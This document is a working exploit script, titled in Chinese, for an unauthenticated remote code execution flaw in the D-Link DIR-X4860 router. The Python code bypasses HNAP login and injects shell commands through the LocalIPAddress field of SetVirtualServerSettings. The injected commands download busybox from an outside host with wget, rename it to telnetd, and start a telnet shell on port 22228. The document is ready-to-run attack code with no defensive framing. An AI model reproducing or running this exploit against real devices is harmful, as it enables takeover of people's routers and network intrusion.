## D-LINK-DIR-X4860未授权RCE漏洞

## exp
```python
#!/usr/bin/env python
import hmac
import base64
import hashlib
from hashlib import sha256
import time
import math
import logging
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
# You must initialize logging, otherwise you'll not see debug output.
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.propagate = True
def get_sha256(value):
    """ get_sha256 """
    hsobj = hashlib.sha256()
    hsobj.update(value.encode("utf-8"))
    return hsobj.hexdigest().upper()
def get_key_hashlib_sha256(key, value):
    """get_key_hashlib_sha256"""
    hsobj = hashlib.sha256(key.encode("utf-8"))
    hsobj.update(value.encode("utf-8"))
    return hsobj.hexdigest().upper()
def get_hmac_hashlib_sha256(value):
    """get_hmac_hashlib_sha256"""
    message = value.encode("utf-8")
    return hmac.new(message, digestmod=hashlib.sha256).hexdigest().upper()
def get_hmac_key_hashlib_sha256(key, value):
    """get_hmac_key_hashlib_sha256"""
    message = value.encode("utf-8")
    return (
        hmac.new(key.encode("utf-8"), message, digestmod=hashlib.sha256)
        .hexdigest()
        .upper()
    )
def get_base64_hmac_sha256(key, value):
    """get_base64_hmac_sha256"""
    key = key.encode("utf-8")
    message = value.encode("utf-8")
    sign = base64.b64encode(hmac.new(key, message, digestmod=sha256).digest())
    base64sha256 = str(sign, "utf-8")
    return base64sha256
def get_md5(value):
    """get_md5"""
    hsobj = hashlib.md5()
    hsobj.update(value.encode("utf-8"))
    return hsobj.hexdigest().upper()
def get_key_md5(key, value):
    """get_key_md5"""
    hsobj = hashlib.md5(key.encode("utf-8"))
    hsobj.update(value.encode("utf-8"))
    return hsobj.hexdigest().upper()
def get_hmac_key_md5(key, value):
    """get_hmac_key_md5"""
    message = value.encode("utf-8")
    return (
        hmac.new(key.encode("utf-8"), message, digestmod=hashlib.md5)
        .hexdigest()
        .upper()
    )
def get_hmac_md5(value):
    """get_hmac_md5"""
    message = value.encode("utf-8")
    return hmac.new(message, digestmod=hashlib.md5).hexdigest().upper()
def send_http(ip, port, https, headers, data):
    """send_http"""
    if https is True:
        https = "s"
    else:
        https = ""
    res = requests.post(
        url=f"http{https}://{ip}:{port}/HNAP1/",
        data=data,
        headers=headers,
        timeout=1,
        verify=False,
    )
    res_text = res.text
    print(f"res_text\n===\n{res.text}\n===\n")
    challenge = ""
    if "<Challenge>" in res_text:
        usb_adv_cgi_id = res_text.split("<Challenge>")
        id_value = usb_adv_cgi_id[1].split("</Challenge>")
        challenge = id_value[0]
        print(f"[+] Challenge = {challenge}")
    cookie = ""
    if "<Cookie>" in res_text:
        usb_adv_cgi_id = res_text.split("<Cookie>")
        id_value = usb_adv_cgi_id[1].split("</Cookie>")
        cookie = id_value[0]
        print(f"[+] Cookie = {cookie}")
    public_key = ""
    if "<PublicKey>" in res_text:
        usb_adv_cgi_id = res_text.split("<PublicKey>")
        id_value = usb_adv_cgi_id[1].split("</PublicKey>")
        public_key = id_value[0]
        print(f"[+] PublicKey = {public_key}")
    if "<LoginResult>" in res_text:
        usb_adv_cgi_id = res_text.split("<LoginResult>")
        id_value = usb_adv_cgi_id[1].split("</LoginResult>")
        login_result = id_value[0]
        print(f"[+] LoginResult = {login_result}")
    return challenge, cookie, public_key, res_text
def login_request(ip, port, https):
    """login_result"""
    xml_post = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <Login xmlns="http://purenetworks.com/HNAP1/">
            <Action>request</Action>
            <Username>Admin</Username>
            <PrivateLogin>Username</PrivateLogin>
            <login_password></login_password>
            <Captcha></Captcha>
        </Login>
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        "Content-Type": "text/xml; charset=UTF-8",
    }
    challenge, cookie, public_key, _ = send_http(ip, port, https, headers, xml_post)
    if challenge == b"":
        print("[-] get Challenge error")
        sys.exit(0)
    return challenge, cookie, public_key
def login_login(ip, port, https, login_password, hnap_auth, time_now, cookie):
    """login_login"""
    xml_post = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <Login xmlns="http://purenetworks.com/HNAP1/">
            <Action>login</Action>
            <Username>Admin</Username>
            <LoginPassword>{login_password}</LoginPassword>
            <Captcha></Captcha>
        </Login>
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "HNAP_AUTH": f"{hnap_auth} {time_now}",
        "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        "Content-Type": "text/xml; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }
    send_http(ip, port, https, headers, xml_post)
def get_internet_conn_up_time(ip, port, https, hnap_auth, time_now, cookie):
    """get_internet_conn_up_time"""
    xml_post = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <GetInternetConnUpTime xmlns="http://purenetworks.com/HNAP1/" />
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "HNAP_AUTH": f"{hnap_auth} {time_now}",
        "SOAPAction": '"http://purenetworks.com/HNAP1/GetInternetConnUpTime"',
        "Content-Type": "text/xml; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }
    _, _, _, res_text = send_http(ip, port, https, headers, xml_post)
    return res_text
def set_virtual_server_settings(ip, port, https, hnap_auth, time_now, cookie, cmd):
    """set_virtual_server_settings"""
    xml_post = f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
        <SetVirtualServerSettings xmlns="http://purenetworks.com/HNAP1/">
            <VirtualServerList>
                <VirtualServerInfo>
                    <Enabled>true</Enabled>
                    <VirtualServerDescription>false</VirtualServerDescription>
                    <ExternalPort>false</ExternalPort>
                    <InternalPort>9</InternalPort>
                    <ProtocolType>UDP</ProtocolType>
                    <ProtocolNumber>UDP</ProtocolNumber>
                    <LocalIPAddress>{cmd}</LocalIPAddress>
                    <ScheduleName>false</ScheduleName>
                </VirtualServerInfo>
                <VirtualServerInfo:0>
                    <Enabled>true</Enabled>
                    <VirtualServerDescription>false</VirtualServerDescription>
                    <ExternalPort>false</ExternalPort>
                    <InternalPort>9</InternalPort>
                    <ProtocolType>UDP</ProtocolType>
                    <ProtocolNumber>UDP</ProtocolNumber>
                    <LocalIPAddress>{cmd}</LocalIPAddress>
                    <ScheduleName>false</ScheduleName>
                </VirtualServerInfo:0>
                <VirtualServerInfo:1>
                    <Enabled>true</Enabled>
                    <VirtualServerDescription>false</VirtualServerDescription>
                    <ExternalPort>false</ExternalPort>
                    <InternalPort>9</InternalPort>
                    <ProtocolType>UDP</ProtocolType>
                    <ProtocolNumber>UDP</ProtocolNumber>
                    <LocalIPAddress>{cmd}</LocalIPAddress>
                    <ScheduleName>false</ScheduleName>
                </VirtualServerInfo:1>
            </VirtualServerList>
        </SetVirtualServerSettings>
    </soap:Body>
</soap:Envelope>"""
    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "HNAP_AUTH": f"{hnap_auth} {time_now}",
        "SOAPAction": '"http://purenetworks.com/HNAP1/SetVirtualServerSettings"',
        "Content-Type": "text/xml; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }
    send_http(ip, port, https, headers, xml_post)
def exploit():
    """ Exploit """
    target_ip = "192.168.4.1"
    target_port = 443
    target_https = True
    print("Login_request")
    challenge, cookie, public_key = login_request(target_ip, target_port, target_https)
    # print(f"{Challenge=}, {Cookie=}, {PublicKey=}")
    dummy_password = "Admin"
    private_key = get_hmac_key_md5(public_key + dummy_password, challenge)
    login_password = get_hmac_key_md5(private_key, challenge)
    print(f"[+] login_password : {login_password}")
    soap_namespace2 = "http://purenetworks.com/HNAP1/"
    action = "Login"
    soap_action = f'"{soap_namespace2}{action}"'
    print(f"[+] SOAPAction : {soap_action}")
    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    print(f"[+] Time : {time_now}")
    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print(f"[+] HNAP_AUTH : {hnap_auth}")
    login_login(
        target_ip, target_port, target_https, login_password, hnap_auth, time_now, cookie
    )
    soap_namespace2 = "http://purenetworks.com/HNAP1/"
    action = "GetInternetConnUpTime"
    soap_action = f'"{soap_namespace2}{action}"'
    print(f"[+] SOAPAction : {soap_action}")
    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    print(f"[+] Time : {time_now}")
    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print(f"[+] HNAP_AUTH : {hnap_auth}")
    print("Checking for the vulnerability")
    res_text = get_internet_conn_up_time(
        target_ip, target_port, target_https, hnap_auth, time_now, cookie
    )
    if "You need proper authorization to use this resource" in res_text:
        print("Target doesn't appear to be vulnerable")
    print("Running the RCE")
    action = "SetVirtualServerSettings"
    soap_action = f'"{soap_namespace2}{action}"'
    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print(
        "Downloading busybox from 'http://192.168.0.100:8000/busybox' as "
        "the one on the device isn't good"
    )
    cmd = "1;wget http://192.168.0.100:8000/busybox -O /tmp/tel;AAAAAAAAAAA"
    set_virtual_server_settings(
        target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
    )
    action = "SetVirtualServerSettings"
    soap_action = f'"{soap_namespace2}{action}"'
    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print("Renaming busybox to /tmp/telnetd")
    cmd = "1;chmod +x /tmp/tel;mv /tmp/tel /tmp/telnetd;AAAAAAAAAAAAAAAAAAAA"
    set_virtual_server_settings(
        target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
    )
    action = "SetVirtualServerSettings"
    soap_action = f'"{soap_namespace2}{action}"'
    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print("Launching telnetd on port 22228")
    cmd = b"1;/tmp/telnetd -p 22228 -l sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    set_virtual_server_settings(
        target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
    )
if __name__ == "__main__":
    exploit()
```
